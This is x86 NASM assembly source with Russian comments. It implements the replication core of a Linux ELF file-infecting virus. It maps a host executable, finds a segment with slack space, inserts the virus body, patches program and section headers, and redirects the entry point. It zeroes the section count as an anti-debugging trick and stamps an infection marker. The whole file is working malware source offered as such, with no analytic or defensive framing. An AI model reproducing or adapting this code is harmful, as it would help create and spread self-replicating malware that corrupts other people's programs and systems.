;сердце виря - процедура размножения
razmnozhatsa
;=======добавить к файлу 16*16*16 байт
mov ecx,[fsize]
add ecx,1000h
mov ebx,[fd]
mov eax,93;truncate
int 80h
;==========================================

;===========выровнять и сделать маппинг
mov eax,1000h
call align
mov dword [aligned],ecx

null ebx
push ebx
push dword [fd]
push 1
push 3
push ecx
push ebx
mov eax,90
mov ebx,esp
int 80h
;=============================================

;=====поиск секции, куда пихнуть вирь
add esp,24
call getloadable
test cx,cx

%ifdef DEBUGVER
jne gets
errors "NO loadable  ", noload,errnoload
jmp unmap
gets
test cx,cx
%endif

je unmap
;===========================================


;======фикс возвращения управления носителю
push dword [ebp+addr-delta]
mov ebx, [e_entry]
mov dword [ebp+addr-delta],ebx
;===================================================

;=====освободить место в секции под вирь
push edi
mov ecx,[fsize]
sub ecx,[esi+4]
sub ecx,[esi+10h]
push esi
mov esi,[fsize]
add esi,eax
dec esi
mov edi,esi
add edi,1000h
std
rep movsb
;================================================

;========скопирывать вирь
inc esi
mov cx,vrsize
lea edi,[ebp+_start-delta]
xchg esi,edi
cld
rep movsb
;============================

pop esi
pop edi
pop dword [ebp+addr-delta]

;====фикс заглоловков
mov edx,[esi+4]
add edx,[esi+10h]
call applyph
call applysh
;========================

mov ebx,1000h
;фикс заголовка зараженного сегмента
add dword [esi+10h],ebx
add dword [esi+14h],ebx
mov dword [esi+18h],7
;========================================

add dword [eax+20h],ebx;фикс адреса начала таблицы заголовков секций
add edx, [esi+8h]
mov dword [eax+18h],edx;новая точка входа

mov word [eax+30h],0;устанавливаем кол-во секций в 0. это что-то
;типа анти-отладки


unmap
;====демаппинг файла
mov dword [eax+9],'TPOC';установка метки заражения
xchg eax,ebx
mov eax,91
mov ecx,[aligned]
int 80h
;=======================
ret
;======================================================

;=========поиск сегмента для заражения. если находим сегмент
;где за счёт выравнивания есть место для виря - он подходит
getloadable
;код - лучший комментарий
push eax
mov cx, word [e_phnum]
mov esi,[e_phoff]
add esi,eax
cycleget
mov edx,[esi]
dec edx
jnz otherone

mov ebx, [esi+14h]
neg ebx
and ebx,0fffh

cmp ebx,vrsize
ja naiden
otherone
add esi,20h

dec cx
jnz cycleget

naiden
pop eax
ret
;==========================================

%include "apply.inc";ещё файл с подпрограммой